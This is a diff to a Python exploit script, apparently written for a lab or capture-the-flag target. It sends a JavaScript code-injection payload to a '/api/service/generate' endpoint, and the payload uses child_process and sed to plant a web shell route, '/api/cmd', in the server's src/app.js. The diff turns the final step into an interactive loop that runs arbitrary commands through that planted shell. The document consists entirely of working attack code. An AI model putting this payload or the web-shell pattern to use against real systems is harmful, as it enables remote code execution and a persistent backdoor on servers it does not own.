@@ -26,7 +26,7 @@ headers2= {
         "Authorization":f"Bearer {token}"
 }
 
-# Step 2: perform command injection
+# Step 2: perform command injection payload
 json2= {"text":"'})+require('child_process').execSync('sed -i \"17i app.get(\\\\\"/api/cmd\\\\\", (req, res) => {  const cmd = require(\\\\\"child_process\\\\\").execSync(req.query.cmd).toString();  res.send(cmd);});\" src/app.js');//"}
 
 response1 = session.post(url=f"{url}/api/service/generate", proxies=proxies, json=json2, headers=headers2)
@@ -34,11 +34,13 @@ response1 = session.post(url=f"{url}/api/service/generate", proxies=proxies, jso
 time.sleep(1)
 
 # Step 3: Run command 
-command = input("Enter command to run: ")
+def command():
+        command = input("Enter command to run: ")
+        response2 = session.get(url=f"{url}/api/cmd?cmd={command}")
+        print(response2.text)
 
-response2 = session.get(url=f"{url}/api/cmd?cmd={command}")
-
-print(response2.text)
-
-
-
+try:
+        while True:
+                command()
+except KeyboardInterrupt:
+        print("ctrl +c detected, exiting gracefully")
